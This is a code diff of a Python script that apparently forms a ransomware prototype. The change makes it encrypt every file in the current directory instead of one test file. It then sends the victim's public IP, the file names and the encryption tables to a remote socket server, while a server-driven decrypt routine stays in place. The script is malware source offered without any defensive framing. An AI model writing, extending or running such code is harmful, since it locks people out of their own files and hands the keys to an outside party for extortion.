@@ -1,8 +1,8 @@
 
 import os
+import json
 import requests
 from pysocket import PySocketClient
-from rsa import decrypt
 from crypto import Crypto
 
 ip = requests.get("http://ip.jsontest.com").json()["ip"]
@@ -15,10 +15,20 @@ ps = PySocketClient(host, port)
 ct = Crypto()
 
 def encrypt(server) :
-    result, table = ct.encrypt_file("test.txt")
+    dir_path = "./"
+    file_list = os.listdir(dir_path)
+    table_list = []
 
-    server.emit("table", str(table))
-    # result = ct.decrypt_file("test.txt", table)
+    for file in file_list :
+        result, table = ct.encrypt_file(dir_path + "/" + file)
+
+        table_list.append(table)
+
+    server.emit("data", json.dumps([{
+        "ip" : ip,
+        "file" : file_list[i],
+        "table" : table_list[i]
+    } for i in range(len(file_list))]))
 
 def decrypt(server) :
     table = server.data[1:-1].split(",")
